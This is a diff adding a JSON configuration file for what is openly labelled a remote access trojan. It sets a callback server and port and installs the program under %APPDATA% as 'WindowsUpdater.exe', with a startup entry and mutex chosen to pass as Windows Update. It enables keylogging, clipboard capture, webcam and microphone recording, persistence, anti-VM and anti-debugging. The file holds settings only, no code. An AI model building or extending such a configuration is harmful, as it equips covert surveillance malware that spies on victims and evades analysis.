@@ -1,0 +1,17 @@
+{
+    "serverIP": "127.0.0.1",
+    "serverPort": 8888,
+    "installPath": "%APPDATA%\\WindowsUpdater.exe",
+    "startupName": "WindowsUpdater",
+    "mutexName": "WindowsUpdateMutex",
+    "connectionInterval": 30,
+    "maxRetries": 10,
+    "keyloggerEnabled": true,
+    "clipboardEnabled": true,
+    "webcamEnabled": true,
+    "microphoneEnabled": true,
+    "persistenceEnabled": true,
+    "antiVMEnabled": true,
+    "antiDebuggingEnabled": true,
+    "encryptionKey": "RAT_KEY_2023_SECURE"
+}
